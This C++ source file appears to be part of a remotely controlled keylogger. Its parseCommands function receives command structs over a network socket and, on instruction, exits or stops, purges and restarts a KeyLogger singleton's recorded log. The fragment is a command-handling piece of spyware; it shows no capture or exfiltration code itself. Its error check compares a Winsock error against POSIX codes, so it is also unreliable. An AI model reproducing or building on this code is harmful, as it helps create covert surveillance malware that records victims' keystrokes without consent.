#include "Parser.hpp"

Parser::Parser()
{
}


Parser::~Parser()
{
}

void Parser::parseCommands()
{
	int read = m_client.receiveData(&m_buffer, sizeof(t_cmd));
	if (read > 0 && WSAGetLastError() != EAGAIN && WSAGetLastError() != EWOULDBLOCK)
	{
		if (read == sizeof(t_cmd))
		{
			t_cmd *command = reinterpret_cast<t_cmd *>(m_buffer);
			if (command->cmd == commandType::CLOSE)
			{
				exit(0);
			}
			if (command->cmd == commandType::PURGE_LOG)
			{
				KeyLogger::getInstance().stopRecording();
				KeyLogger::getInstance().purgeLog();
				KeyLogger::getInstance().startRecording();
			}
		}
	}
}